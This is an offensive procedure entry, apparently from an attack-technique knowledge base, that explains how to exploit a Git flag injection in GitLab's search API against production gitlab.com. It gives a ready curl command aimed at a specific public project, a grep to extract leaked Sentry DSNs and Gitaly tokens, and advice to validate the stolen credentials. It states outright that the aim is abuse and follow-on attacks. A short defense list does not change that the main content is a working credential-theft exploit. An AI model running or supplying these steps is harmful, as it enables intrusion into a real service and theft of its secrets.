---
id: proc-uuid-3
tags:
  - credential-theft
  - production-exploit
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-gitlab-search-injection-production]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Data from Local System]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:48.443Z'
skill_level: intermediate
impact_level: critical
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Data from Local System]]'
  - '[[Exploit Public-Facing Application]]'
---
# Extract-Sensitive-Tokens-from-Production

## Summary

This procedure reproduces the Git flag injection on a production GitLab instance like gitlab.com to extract real sensitive tokens from config.toml, such as Sentry DSNs and Gitaly tokens, for potential abuse.

## Description

Targeting public projects on production, this builds on the injection to leak actual credentials. The 'search=a' pattern matches lines in config files, returning escaped JSON with tokens. Requires no auth for public endpoints but risks detection on monitored production systems.

## Requirements

1. Internet access to target production GitLab (e.g., gitlab.com)
2. Known public project ID (e.g., 2009901)
3. curl for unauthenticated requests
4. Ability to validate extracted credentials externally

## Defense

Defensive measures and detection strategies:

- Patch GitLab to latest version (>=12.3) to fix ref sanitization
- Restrict API search scope to authenticated users only on production
- Monitor for high-volume or anomalous search queries; integrate with SIEM for flag injections
- Rotate exposed credentials immediately upon detection

## Objectives

1. Leak production config.toml contents via injection
2. Extract usable tokens like Sentry DSNs
3. Enable follow-on attacks with stolen credentials

## Instructions

### Step 1: Send Production Injection Request

**Context**: Target a public project to trigger the leak without auth.

**Command** ([[commands/curl-gitlab-search-injection-production]]):
```bash
curl 'https://gitlab.com/api/v4/projects/2009901/search?scope=blobs&search=a&ref=--no-index'
```

> This executes the exploit on gitlab.com, searching for 'a' to match config lines. Expected output includes JSON with DSNs and tokens.

### Step 2: Parse and Validate Tokens

**Context**: Extract and test the leaked credentials.

Save response and grep:
```bash
grep -o 'https://[^ ]*sentry.gitlab.net' response.json
```

> Reveals DSNs like 'https://927bee37df654608xxxxxxxxxxxxxxxx:0324504ee7844264xxxxxxxxxxxxxxxx@sentry.gitlab.net/16'; test by sending a log event to Sentry.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Data from Local System]] Data from Local System
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques

- None

## Commands Used

- [[commands/curl-gitlab-search-injection-production]]

## Tools Used

- [[tools/curl]]

## Tags

- credential-theft
- sentry-dsn
- gitaly-token
